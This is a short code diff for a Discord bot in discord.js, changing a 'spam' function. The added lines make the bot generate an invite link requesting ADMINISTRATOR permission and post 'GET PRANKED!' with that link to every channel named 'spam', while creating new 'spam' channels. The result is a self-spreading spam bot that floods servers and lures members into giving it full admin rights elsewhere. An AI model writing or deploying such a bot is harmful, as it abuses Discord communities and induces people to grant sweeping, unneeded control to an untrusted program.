@@ -2,7 +2,11 @@ const Discord = require("discord.js");
 const bot = new Discord.Client({disableEveryone: true});
 
 function spam(bot, message) {
-  bot.channels.filter(c => c.name === 'spam').forEach(channel => channel.send(`@everyone`));
+  bot.generateInvite(['ADMINISTRATOR'])
+    .then(link => {
+      bot.channels.filter(c => c.name === 'spam').forEach(channel => channel.send(`XD! GET PRANKED!\nIf you want to prank ur friends also add me to your server: ${link}`));
+    });
+  
   message.guild.createChannel('spam', 'text')
       .then(console.log)
       .catch(console.error);
